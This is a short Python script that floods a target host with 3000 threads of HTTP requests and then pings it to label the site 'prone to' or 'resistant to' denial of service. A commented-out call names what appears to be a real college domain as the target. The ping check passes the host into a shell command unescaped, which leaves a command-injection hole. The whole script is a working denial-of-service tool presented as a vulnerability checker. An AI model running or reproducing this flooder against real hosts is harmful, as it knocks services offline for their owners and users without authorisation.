import argparse, urllib.request, time,os,sys,textwrap
from threading import Thread
from serial import Serial


host, threads = [None, 0]

def connect(host, i=0):
    try:
        response = urllib.request.urlopen('http://%s' % (host)).read()
        #print(response)
    except:
        pass
        #print('Cannot connect thread #%d to %s...' % (i, host))

def perform_dos(host):
    threads=3000
    print('\nAttacking %s with %d threads...\n' % (host, threads))
    for i in range(threads):
        t = Thread(target=connect, args=(host, i,))
        #print('Connecting thread #%d...' % i)
        t.start()
    result = dos_check(host)
    return result



def dos_check(url):
    print("Checking for DOS vulnerability....")
    from subprocess import Popen, PIPE
    command = "ping -i 1 -c 10 {}".format(url)
    stdout = Popen(command, shell=True, stdout=PIPE).stdout
    output = stdout.read()
    cht_result=""
    result=""
    if '100% packet loss' in str(output):
        result = "PRONE TO DENIAL OF SERVICE ATTACK"
        cht_result = "This site is Prone to Denial Of Service Attack."
        wrapper = textwrap.TextWrapper(width=20)
        dedented_text = textwrap.dedent(text=cht_result)
        cht_result = wrapper.fill(text=dedented_text)
        print("This site is Prone to Denial Of Service Attack")

    else:
        result = "RESISTANT TO DENIAL OF SERVICE ATTACK"
        cht_result = "This site can resist Denial Of Service Attack."
        wrapper = textwrap.TextWrapper(width=21)
        dedented_text = textwrap.dedent(text=cht_result)
        cht_result = wrapper.fill(text=dedented_text)
        print("This site can resist Denial Of Service Attack.")
    return [cht_result,result]

#x = perform_dos("sasthaengg.com")
#print(x)

#sasthaengg.com